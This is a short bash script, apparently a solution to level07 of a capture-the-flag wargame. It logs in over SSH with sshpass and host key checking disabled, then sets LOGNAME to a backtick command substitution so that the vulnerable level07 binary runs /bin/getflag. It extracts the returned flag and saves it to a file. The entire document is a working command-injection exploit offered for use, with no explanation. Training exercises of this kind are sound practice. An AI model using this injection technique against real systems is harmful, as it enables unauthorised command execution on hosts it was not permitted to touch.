#!/usr/bin/env bash

SCRIPT=$(cat <<EOF
LOGNAME='\`/bin/getflag\`'; ./level07 | awk '{print $NF}'
EOF
)

if [ ! -z "$1" ] && [ ! -z "$2" ] && [ ! -z "$3" ]; then
	PASS=$(sshpass -p $3 ssh -o StrictHostKeyChecking=no level07@$1 -p $2 "$SCRIPT")
	PASS=$(echo $PASS | awk 'NR==1 {print $NF}')
	echo "$PASS"
	echo "$PASS" | awk 'END{print}' > flag07.pwd
else
	echo "Usage: ./flag07.sh <ip address> <port> <password>"
fi
